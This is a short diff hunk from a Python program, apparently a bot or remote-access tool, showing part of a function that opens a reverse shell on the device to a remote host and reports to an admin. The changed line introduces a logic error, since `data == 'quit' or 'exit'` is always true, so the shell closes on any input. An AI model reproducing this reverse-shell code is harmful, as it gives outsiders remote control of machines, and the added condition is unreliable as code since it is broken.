@@ -221,7 +221,7 @@ def rShell(rsHost, rsPort): # Open a reverse shell on this device.
         while rsConnected:
             try:
                 data = rs.recv(1024).decode("UTF-8")
-                if data == "quit":
+                if data == "quit" or "exit":
                     rs.close()
                     sendntc("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!", adminname)
                     if debugmode:
